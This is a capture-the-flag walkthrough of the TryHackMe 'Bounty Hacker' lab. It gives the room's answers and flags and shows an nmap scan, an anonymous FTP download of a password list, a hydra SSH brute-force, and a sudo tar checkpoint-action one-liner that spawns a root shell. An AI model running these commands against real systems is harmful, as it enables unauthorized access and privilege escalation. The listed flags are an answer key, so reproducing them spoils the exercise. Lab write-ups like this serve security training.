# Bounty Hacker

### 1. Who wrote the task list? 
---

Answer : lin

---

### 2. What service can you bruteforce with the text file found?
---

Answer : ssh    

---
### 3. What is the users password?  
---

Answer : RedDr4gonSynd1cat3

---
### 4. user.txt
---

Answer : THM{CR1M3_SyNd1C4T3}

---
### 5. root.txt
---

Answer : THM{80UN7Y_h4cK3r}

---
Commands and tools used to pwn this box
```shell
┌──(grimlock㉿GRIMLOCK)-[~]
└─$ nmap -A -T4 10.10.132.186 -vv
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-02 18:03 IST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
Initiating Ping Scan at 18:03
Scanning 10.10.132.186 [2 ports]
Completed Ping Scan at 18:03, 0.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:03
Completed Parallel DNS resolution of 1 host. at 18:03, 0.03s elapsed
Initiating Connect Scan at 18:03
Scanning 10.10.132.186 [1000 ports]
Discovered open port 21/tcp on 10.10.132.186
Discovered open port 80/tcp on 10.10.132.186
Discovered open port 22/tcp on 10.10.132.186
Completed Connect Scan at 18:04, 9.73s elapsed (1000 total ports)
Initiating Service scan at 18:04
Scanning 3 services on 10.10.132.186
Completed Service scan at 18:04, 6.38s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.132.186.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:04
NSE: [ftp-bounce 10.10.132.186:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.76% done; ETC: 18:04 (0:00:00 remaining)
Completed NSE at 18:04, 31.50s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:04
Completed NSE at 18:04, 1.66s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:04
Completed NSE at 18:04, 0.00s elapsed
Nmap scan report for 10.10.132.186
Host is up, received syn-ack (0.18s latency).
Scanned at 2024-05-02 18:03:54 IST for 50s
Not shown: 967 filtered tcp ports (no-response)
PORT      STATE  SERVICE         REASON       VERSION
20/tcp    closed ftp-data        conn-refused
21/tcp    open   ftp             syn-ack      vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.46.12
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open   ssh             syn-ack      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgcwCtWTBLYfcPeyDkCNmq6mXb/qZExzWud7PuaWL38rUCUpDu6kvqKMLQRHX4H3vmnPE/YMkQIvmz4KUX4H/aXdw0sX5n9jrennTzkKb/zvqWNlT6zvJBWDDwjv5g9d34cMkE9fUlnn2gbczsmaK6Zo337F40ez1iwU0B39e5XOqhC37vJuqfej6c/C4o5FcYgRqktS/kdcbcm7FJ+fHH9xmUkiGIpvcJu+E4ZMtMQm4bFMTJ58bexLszN0rUn17d2K4+lHsITPVnIxdn9hSc3UomDrWWg+hWknWDcGpzXrQjCajO395PlZ0SBNDdN+B14E0m6lRY9GlyCD9hvwwB
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCu8L8U5da2RnlmmnGLtYtOy0Km3tMKLqm4dDG+CraYh7kgzgSVNdAjCOSfh3lIq9zdwajW+1q9kbbICVb07ZQ=
|   256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqmJn+c7Fx6s0k8SCxAJAoJB7pS/RRtWjkaeDftreFw
80/tcp    open   http            syn-ack      Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
```
ftp wasnt responding well when I used my machine using openvpn so a part of it I did in the attackbox :) 
```shell
┌root@ip-10-10-165-121:~# ftp 10.10.132.186
Connected to 10.10.132.186.
220 (vsFTPd 3.0.3)
Name (10.10.132.186:root): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get task.txt /ctf
local: /ctf remote: task.txt
local: /ctf: No such file or directory
ftp> get task.txt 
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (104.9072 kB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.07 secs (6.2640 kB/s)
ftp> exit
221 Goodbye.
```
````shell
root@ip-10-10-165-121:~# cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
````
```shell
root@ip-10-10-165-121:~# cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
```shell
root@ip-10-10-165-121:~# hydra -l lin -P locks.txt 10.10.132.186 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2024-05-02 13:52:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.132.186:22/
[22][ssh] host: 10.10.132.186   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2024-05-02 13:52:21
```
```shell
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}
```
```shell
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
# cat root.txt
THM{80UN7Y_h4cK3r}
```